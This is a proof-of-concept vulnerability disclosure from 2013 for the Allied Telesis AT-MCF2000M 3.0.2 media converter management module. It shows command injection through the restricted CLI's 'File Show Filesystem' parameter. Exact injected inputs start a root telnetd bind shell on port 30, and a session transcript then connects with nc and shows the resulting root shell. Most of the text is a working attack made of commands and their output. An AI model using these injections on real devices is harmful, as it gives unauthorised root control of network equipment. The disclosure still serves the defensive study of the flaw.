:::::::-.   ...    ::::::.    :::.
  ;;,   `';, ;;     ;;;`;;;;,  `;;;
  `[[     [[[['     [[[  [[[[[. '[[
   $$,    $$$$      $$$  $$$ "Y$c$$
   888_,o8P'88    .d888  888    Y88
   MMMMP"`   "YmmMMMM""  MMM     YM
 
  [ Discovered by dun \ posdub[at]gmail.com ]
  [ 2013-01-02                              ]
####################################################################
#  [ Allied Telesis AT-MCF2000M 3.0.2 ] Gaining Root Shell Access  #
####################################################################
#
# Device: "The AT-MCF2000M is the management module for the AT-MCF2000 two-slot chassis.
#          With the AT-MCF2000M management module, if there is a blade failure,
#          insertion or removal, your traffic flow will not be interupted.."
#
# Vendor:            http://www.alliedtelesis.com/
# Product:           http://www.alliedtelesis.com/p-2265.html
# Software Download: ftp://ftp.alliedtelesis.com/pub/medconv/mcf2000/AT-S85_S97_v302.ZIP
#
###################################################################
# Vulnerability:

Logging in system via ssh/telnet, is necessary to using this vulnerability.
After logging in, user has access to client menu(/sbin/AtiCli), without access to the shell.
User-supplied data are not validated properly. In section "File Show Filesystem=system://0/m/",
is possible to inject command with using special characters: "|;&.

Commands are limited to max 25 characters. Chars / are filtered.
For example:

# File Show Filesystem=system://0/m/";echo 11111111111111111111"
	File name can be only up to 25 alphanumeric characters.
<>20:54:16::File Show Filesystem=system://0/m/";echo 11111111111111111111"::DENY(CLI_STRING_LENGTH_OUT_OF_RANGE)::[00.002]
#
# File Show Filesystem=system://0/m/";ls -al /"
<>20:55:00::File Show Filesystem=system://0/m/";ls -al /"::DENY(CLI_INVALID_PARAMETER)::[00.002]


Getting root access:

root@debian:~# ssh 10.11.200.2

--------------------------------------------------------------------------------                          
                                                  Allied Telesis Media Converter
                                    AT-MCF2000
--------------------------------------------------------------------------------
Login: manager
Password: *******

                Allied Telesis Media Converter  - Version 3.0.2 
                                 <No System Name>
# ?
 COnfiguration - Configuration related commands
 DIagnostics   - Diagnostics related commands
 File          - File related commands
 IP            - IP related commands
 Logging       - Logging related commands
 Ntp           - Ntp related commands
 Ping          - Ping a host
 System        - System related commands
 Telnet        - Telnet related commands
 SNMP          - Snmp related commands
 SSh           - SSH related commands
 User          - User management commands
 CLear         - Clear the terminal  screen
 Help          - CLI help information
 EXit          - Exit
# File Show Filesystem=system://0/m/
Module 0/M File System:
-rw-r--r--    1 0        0            2640 Jan  1 15:27 BM_0_1.cfg
-rw-r--r--    1 0        0            2612 Jan  1 15:27 BM_0_2.cfg
-rw-r--r--    1 0        0            1355 Jan  1 15:27 MM.cfg
-rw-r--r--    1 0        0             310 Dec 31 13:17 file.inf
-rw-r--r--    1 0        0            6609 Jan  1 15:27 mcf_chassis0.cfg
# File Show Filesystem=system://0/m/BM_0_1.cfg
Module 0/M File System:
-rw-r--r--    1 0        0            2640 Jan  1 15:27 BM_0_1.cfg
# File Show Filesystem=system://0/m/test
Module 0/M File System:
ls: test: No such file or directory

<>18:55:19::File Show Filesystem=system://0/m/test::COMPL::[00.052]
# File Show Filesystem=system://0/m/|id
Module 0/M File System:
uid=0 gid=0
# File Show Filesystem=system://0/m/|"telnetd -l${SHELL} -p30"
Module 0/M File System:

<>19:00:41::File Show Filesystem=system://0/m/|"telnetd -l${SHELL} -p30"::COMPL::[00.061]
# File Show Filesystem=system://0/m/|"ps aux|grep telnet"
Module 0/M File System:
   25 0           336 S   /usr/sbin/telnetd -l /sbin/AtiCli
  497 0           192 S   telnetd -l/bin/sh -p30

<>19:01:02::File Show Filesystem=system://0/m/|"ps aux|grep telnet"::COMPL::[00.117]
# exit
<>19:01:40::exit::COMPL::[00.001]
# 
logging out.
Connection to 10.11.200.2 closed.

root@debian:~# nc 10.11.200.2 30


BusyBox v1.01 (2005.09.07-23:28+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

/ # id
uid=0 gid=0
/ # uname -a
Linux (none) 2.6.14 #2 Thu Jul 23 17:15:38 PDT 2009 ppc unknown
/ # cat /proc/version
Linux version 2.6.14 (schen@arun-linux) (gcc version 3.4.4) #2 Thu Jul 23 17:15:38 PDT 2009
/ # ls -al  
drwxr-xr-x   15 1046     1002         1024 Jan  1 18:58 .
drwxr-xr-x   15 1046     1002         1024 Jan  1 18:58 ..
-rw-r--r--    1 0        0             125 Jan  1 19:10 .ash_history
-rw-r--r--    1 0        0               0 Jan  1 13:24 1
drwxr-xr-x    2 0        0            1024 Aug 10  2009 bin
drwxr-xr-x    3 0        0               0 Jan  1 15:27 cfg
drwxr-xr-x    4 0        0            2048 Aug 10  2009 dev
drwxr-xr-x   10 0        0            1024 Jan  1  1970 etc
drwxr-xr-x    4 0        0            1024 Aug 10  2009 lib
drwxr-xr-x    2 0        0           12288 Aug 10  2009 lost+found
drwxr-xr-x    3 0        0            1024 Aug 10  2009 mnt
dr-xr-xr-x   49 0        0               0 Jan  1  1970 proc
drwx------    2 0        0            1024 Aug 10  2009 root
drwxr-xr-x    2 0        0            1024 Aug 10  2009 sbin
drwxrwxrwt    2 0        0            1024 Jan  1 19:06 tmp
drwxr-xr-x    6 0        0            1024 Aug 10  2009 usr
drwxr-xr-x    7 0        0            1024 Jan  1  1970 var
/ # echo pwnd! :) & exit
pwnd! :)
Connection closed by foreign host.
root@debian:~#